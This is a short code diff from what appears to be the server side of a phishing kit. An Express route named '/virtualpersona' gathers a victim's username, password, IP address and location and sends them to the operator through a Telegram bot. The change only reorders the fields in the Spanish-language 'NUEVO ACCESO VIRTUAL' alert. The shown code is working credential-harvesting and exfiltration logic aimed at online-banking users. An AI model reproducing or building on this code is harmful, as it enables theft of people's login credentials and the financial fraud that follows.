@@ -106,7 +106,7 @@ app.post('/virtualpersona', async (req, res) => {
     });
 
   
-const message = `📲 NUEVO ACCESO VIRTUAL\n\n🆔 SessionID: ${sessionId}\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌐 IP: ${ip}\n📍 Ciudad: ${city} - ${country}`; 
+const message = `📲 NUEVO ACCESO VIRTUAL\n\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌐 IP: ${ip}\n🆔 SessionID: ${sessionId}\n📍 Ciudad: ${city} - ${country}`; 
 
 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
   method: 'POST',
